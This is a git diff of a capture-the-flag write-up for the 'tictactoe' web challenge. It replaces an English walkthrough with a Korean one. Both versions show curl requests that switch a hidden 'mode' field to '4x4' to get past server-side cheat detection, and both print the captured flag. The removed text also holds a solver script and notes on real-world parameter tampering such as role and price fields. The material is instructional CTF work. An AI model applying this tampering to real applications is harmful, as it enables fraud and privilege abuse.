@@ -15,57 +15,34 @@ comments: false
 - **Name:** tictactoe
 - **Category:** Web
 - **Description:** The NEURAL-LINK CORE v4.4 is online, and its logic is absolute. If you want the flag, you'll have to break the protocol, not just the game.
-- **Difficulty:** ★★☆☆☆ (141 points, solving 135 out of 887 teams)
+- **Difficulty:** ★★☆☆☆ (141 points, 135 solves / 887 teams)
+- **Connection:** `https://ctf-challenge-1-beige.vercel.app`
+- **Flag format:** `EH4X{...}`
 
 ---
 
-## TL;DR
+### 개요
 
-The game sends board state directly to the server via a POST API.
-The server checks for cheating in `3x3` mode — but completely skips validation in `4x4` mode.
-Send a full-X board using `mode: "4x4"` and get the flag.
+틱택토 게임입니다.
+문제 설명에 힌트가 있습니다.
 
----
+> "If you want the flag, you'll have to **break the protocol**, not just the game."
 
-## Overview
-
-We are given a Tic-Tac-Toe game hosted at:
-`https://ctf-challenge-1-beige.vercel.app/`
-
-The description says:
-
-> "The NEURAL-LINK CORE v4.4 is online, and its logic is absolute.
-> If you want the flag, you'll have to **break the protocol**, not just the game."
-
-The key phrase is **"break the protocol"** — this tells us the goal is not to win the game normally, but to manipulate how the game communicates with the server.
+게임을 이기는 것이 아니라, **프로토콜을 조작**하는 것이 목표입니다.
+DevTools를 열고 Network 탭에서 한 수를 두어보면
+`POST /api`로 요청이 나가는 것이 보입니다.
 
 ---
 
-<img width="725" height="530" alt="image" src="https://github.com/user-attachments/assets/6fbb02d7-cead-43c0-b1fe-fcffea11f057" />
+### 소스 분석
 
----
-
-## Solution
-
-### 1) Recon
-
-First, open DevTools (F12) → Network tab and play one move.
-You'll see a POST request going to `/api`.
-
-Then, check the page source to find JavaScript files:
-
-```bash
-curl -s https://ctf-challenge-1-beige.vercel.app/ | grep -oP 'src="[^"]*"'
-# Output: src="script.js"
-```
-
-Read `script.js`:
+#### script.js — API 통신 확인
 
 ```bash
 curl -s https://ctf-challenge-1-beige.vercel.app/script.js
 ```
 
-Inside, the key function is:
+핵심 함수를 찾아봅니다.
 
 ```js
 async function syncWithCore() {
@@ -77,45 +54,43 @@ async function syncWithCore() {
     const data = await response.json();
 
     if (data.flag) {
-        // Show the flag on screen!
         status.innerHTML = `...${data.flag}...`;
     }
 }
 ```
 
-**What we learned:**
+클라이언트가 `mode`와 `state`를 직접 조립해서 보냅니다.
+`data.flag`가 있으면 화면에 출력됩니다.
 
-- The API endpoint is `POST /api`
-- It sends `{ mode: "3x3", state: board }` where `board` is a 3×3 array
-  - `1` = player (X)
-  - `-1` = AI (O)
-  - `0` = empty
-- If the server returns `data.flag`, it gets shown on screen
-- **The client controls what board state gets sent — no protection on the client side**
+`state`는 `1`(플레이어), `-1`(AI), `0`(빈 칸)으로 구성된 배열입니다.
+클라이언트 측에는 아무 보호가 없으므로,
+원하는 보드 상태를 직접 서버로 보낼 수 있습니다.
 
 ---
 
-### 2) Root Cause
+### 취약점 분석
 
-Try sending a winning board directly:
+#### 3x3 모드 — 치트 감지 있음
+
+이긴 상태의 보드를 직접 보내봅니다.
 
 ```bash
-curl -s -X POST https://ctf-challenge-1-beige.vercel.app/api \
+curl -s -X POST "https://ctf-challenge-1-beige.vercel.app/api" \
   -H "Content-Type: application/json" \
   -d '{"mode":"3x3","state":[[1,1,1],[0,-1,0],[-1,0,0]]}'
 ```
 
-Response:
+응답:
+
 ```json
 {
-  "message": "AI: I've simulated this 3x3 grid 10^6 times. You don't win in any of them.",
-  "ai_move": 3
+  "message": "AI: I've simulated this 3x3 grid 10^6 times. You don't win in any of them."
 }
 ```
 
-The server **detects the cheating** in `3x3` mode and ignores the win.
+서버가 불가능한 보드 상태를 감지하고 거부합니다.
 
-When the board is full (DRAW), the server replies:
+무승부 상태를 보내면 이런 응답이 옵니다.
 
 ```json
 {
@@ -124,108 +99,74 @@ When the board is full (DRAW), the server replies:
 }
 ```
 
-The hint — **"inspect the headers of your reality"** — points toward something about how the request is structured. After trying HTTP headers with no luck, the focus shifts to the `mode` field in the request body.
+`"inspect the headers of your reality"` — 요청 구조를 살펴보라는 힌트입니다.
+HTTP 헤더를 이것저것 바꿔봐도 변화가 없습니다.
+시선을 `mode` 필드로 돌려봅니다.
 
-Try different mode values:
+#### 4x4 모드 — 치트 감지 없음
+
+`mode`를 `"4x4"`로 바꿔봅니다.
 
 ```bash
-curl -s -X POST https://ctf-challenge-1-beige.vercel.app/api \
+curl -s -X POST "https://ctf-challenge-1-beige.vercel.app/api" \
   -H "Content-Type: application/json" \
   -d '{"mode":"4x4","state":[[1,1,1,1],[-1,-1,0,0],[0,0,0,0],[0,0,0,0]]}'
 ```
 
-Response:
+응답:
+
 ```json
 {
   "message": "4x4_MODE_ACTIVE: AI sensors blind in ghost sectors."
 }
 ```
 
-**"AI sensors blind"** — the server has a `4x4` mode, and in that mode the cheat detection is turned off.
+**"AI sensors blind"** — 4x4 모드에는 치트 감지 로직이 없습니다.
+서버에 숨겨진 모드가 있고, 그 경로에는 검증이 빠져 있습니다.
 
-The root cause is simple:
-
-| Mode | Cheat Detection | Board Validation |
-|------|----------------|-----------------|
-| `3x3` | ✅ Enabled | ✅ Checks for valid win/cheat |
-| `4x4` | ❌ Disabled | ❌ No checks at all |
-
-The developer added a secret mode but forgot to add validation logic for it.
+| 모드 | 치트 감지 | 보드 검증 |
+|------|----------|----------|
+| `3x3` | ✅ 있음 | ✅ 있음 |
+| `4x4` | ❌ 없음 | ❌ 없음 |
 
 ---
 
-### 3) Exploit
+### Exploit 실행 과정
 
-Since `4x4` mode skips all validation, send an impossible board where X fills every single cell:
+4x4 모드에서 X로 가득 찬 불가능한 보드를 보냅니다.
 
 ```bash
-curl -s -X POST https://ctf-challenge-1-beige.vercel.app/api \
+curl -s -X POST "https://ctf-challenge-1-beige.vercel.app/api" \
   -H "Content-Type: application/json" \
   -d '{"mode":"4x4","state":[[1,1,1,1],[1,1,1,1],[1,1,1,1],[1,1,1,1]]}'
 ```
 
-Response:
+실행 결과:
+
 ```json
 {
-  "message": "AI: Protocol bypassed... You didn't just play the game; you rewrote the rules. Respect.",
+  "message": "AI: Protocol bypassed... You didn't just play the game; you rewrote the rules.",
   "flag": "EH4X{D1M3NS1ONAL_GHOST_1N_TH3_SH3LL}"
 }
 ```
 
-Flag captured. ✅
-
 ---
 
-### 4) Why It Works
+### FLAG
 
-This is a classic **server-side trust issue**.
-
-In a normal secure application, the server should:
-1. Check that the board state is actually reachable (no impossible positions)
-2. Apply the same validation rules for every game mode
-
-Here, the developer validated the `3x3` mode carefully, but introduced a hidden `4x4` mode without copying over the same checks. This is sometimes called **inconsistent input validation** — the security rules only apply to the "known" path, and any unknown path bypasses them entirely.
-
-The game UI never exposes `4x4` mode — but since the client sends `mode` freely, and the server trusts whatever value it receives, we can reach hidden server logic just by changing one field.
-
-This kind of vulnerability appears in real-world applications too:
-- Sending `role: "admin"` in a registration request
-- Changing `price: 1` when buying items
-- Using hidden API parameters not shown in the UI
-
----
-
-## Solver
-
-Save as `solve.sh` and run it:
-
-```bash
-#!/bin/bash
-# TICTACTOE CTF Solver
-# EHAX CTF 2026
-
-TARGET="https://ctf-challenge-1-beige.vercel.app/api"
-
-echo "[*] Sending impossible 4x4 board..."
-
-curl -s -X POST "$TARGET" \
-  -H "Content-Type: application/json" \
-  -d '{"mode":"4x4","state":[[1,1,1,1],[1,1,1,1],[1,1,1,1],[1,1,1,1]]}' \
-  | python3 -c "import sys,json; d=json.load(sys.stdin); print('[+] FLAG:', d.get('flag','Not found'))"
-```
-
-Or one-liner:
-
-```bash
-curl -s -X POST https://ctf-challenge-1-beige.vercel.app/api \
-  -H "Content-Type: application/json" \
-  -d '{"mode":"4x4","state":[[1,1,1,1],[1,1,1,1],[1,1,1,1],[1,1,1,1]]}' | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('flag'))"
-```
-
-**Output:**
 ```
 EH4X{D1M3NS1ONAL_GHOST_1N_TH3_SH3LL}
 ```
+
 ---
-<img width="2079" height="124" alt="스크린샷 2026-03-01 071002" src="https://github.com/user-attachments/assets/95f977ef-761a-45a3-9810-d785aa4400a1" />
----
+
+### 요약
+
+이 문제의 핵심은 **일관성 없는 입력 검증**입니다.
+
+`3x3` 모드에는 치트 감지가 있지만,
+숨겨진 `4x4` 모드에는 같은 검증이 적용되지 않았습니다.
+
+클라이언트가 `mode` 필드를 자유롭게 바꿀 수 있고,
+서버가 그 값을 그대로 신뢰하는 순간
+숨겨진 경로를 통해 검증을 전부 우회할 수 있습니다.
